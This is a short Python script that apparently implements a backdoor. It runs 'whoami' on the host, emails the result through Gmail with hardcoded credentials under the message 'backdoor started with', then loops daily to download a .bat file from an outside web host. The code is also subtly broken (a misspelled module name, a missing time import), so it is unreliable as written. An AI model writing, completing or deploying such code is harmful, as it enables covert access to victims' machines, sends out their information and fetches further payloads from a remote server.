import smtplib
import subprocess
import re
import requests
import os

def download(url):
	get_response = requestes.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "whoami"
name = subprocess.check_output(command, shell=True)
send_mail("captianlastimosa@gmail.com", "wither14", "backdoor started with" + name)

repeating = True
while repeating:
    download("http://mogiant.azurewebsites.net/todaysfile.bat")
    time.sleep(86400)
